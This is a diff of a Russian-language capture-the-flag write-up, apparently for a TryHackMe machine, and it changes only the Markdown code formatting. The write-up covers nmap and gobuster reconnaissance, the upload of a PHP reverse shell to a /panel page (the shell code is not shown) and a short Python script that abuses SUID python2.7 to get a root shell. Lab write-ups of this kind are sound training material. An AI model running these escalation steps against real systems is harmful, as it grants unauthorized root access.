@@ -3,8 +3,8 @@
 ## Разведка
   Для начала проверим машину на наличие открытых портов с помощью утилиты nmap командой `nmap -sV IP_ADDRESS`.
 Вывод:
-
-`Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-06 14:00 -0400
+```
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-06 14:00 -0400
 Nmap scan report for 10.81.145.169
 Host is up (0.074s latency).
 Not shown: 999 closed tcp ports (reset)
@@ -13,18 +13,18 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 4.93 seconds
-`
+```
 
 Отсюда видно, что открыты два порта: 22 и 80. На 80 порту запущен Apache 2.4.41, а на 22 ssh.
   Далее проверим машину на наличие директорий утилитой gobuster. Вводим команду `gobuster dir -u http://IP_ADDRESS -w /usr/share/wordlists/dirb/small.txt -x php`.
 Вывод:
-
-`css                  (Status: 301) [Size: 312] [--> http://10.81.145.169/css/]
+```
+css                  (Status: 301) [Size: 312] [--> http://10.81.145.169/css/]
 index.php            (Status: 200) [Size: 616]
 js                   (Status: 301) [Size: 311] [--> http://10.81.145.169/js/]
 panel                (Status: 301) [Size: 314] [--> http://10.81.145.169/panel/]
 uploads              (Status: 301) [Size: 316] [--> http://10.81.145.169/uploads/]
-`
+```
 
 ## Получение Реверс-Шела
 В директории /panel находится место для загрузки файлов. Я сразу попробовал загрузить туда сырой шелл с расширением .php
@@ -43,11 +43,11 @@ uploads              (Status: 301) [Size: 316] [--> http://10.81.145.169/uploads
 `/usr/bin/python2.7`
 Мы можем запускать python-файлы от имени суперпользователя. Расскажу один важный ньюанс: в качестве защиты, пайтон сбрасывает привилегии перед запуском, поэтому я сразу же в файле поставлю себе guid и uid в значения 0.
 Сразу перехожу в директорию /tmp, потому что там скорее всего у нас будут права для создания скрипта. Код скрипта:
-
-`import os
+```
+import os
 os.setgid(0)
 os.setuid(0)
-os.system('/bin/bash -p') #Флаг -p тут для того, чтобы bash тоже не сбрасывал наши привилегии до обычного юзера`
-
+os.system('/bin/bash -p') #Флаг -p тут для того, чтобы bash тоже не сбрасывал наши привилегии до обычного юзера
+```
 После запуска сразу получаем права суперпользователя и перейдя в /root, получаем файлик root.txt c флагом.
-Флаг: THM{pr1v1l3g3_3sc4l4t10n}
+Флаг: `THM{pr1v1l3g3_3sc4l4t10n}`
